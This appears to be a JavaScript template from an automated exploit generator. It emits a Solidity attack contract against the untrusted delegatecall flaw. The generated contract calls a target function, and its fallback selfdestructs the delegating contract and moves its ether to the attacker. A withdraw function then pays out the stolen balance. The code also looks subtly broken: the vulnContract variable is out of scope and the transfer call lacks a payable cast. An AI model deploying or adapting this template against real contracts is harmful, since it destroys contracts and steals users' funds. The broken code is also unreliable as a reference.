let unTrustedDelegateCall_ExploitTemplate = 
`
//SPDX-License-Identifier:MIT
pragma solidity ^0.8;

${targetContract}

contract ExploitUntrustedDelegateCall{

    constructor(address _vulnContract){
        contractName vulnContract = contractName(_vulnContract);
    }

    function Exploit(${topLevelFnParams}) public payable {
        vulnContract.${funcName}(${exploitfnParams});
    }

    // Function to be called after successful exploit
    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }

    receive() external payable { }

    fallback() external payable {

        // When this contract is called via delegate call without any explicit function name, the fallback is executed.
        // This fallback function executes a selfdestruct on the calling contract.
        // It also transfers any ether of the calling contract, to the Exploit Contract.
        selfdestruct(address(this));
    }
}
`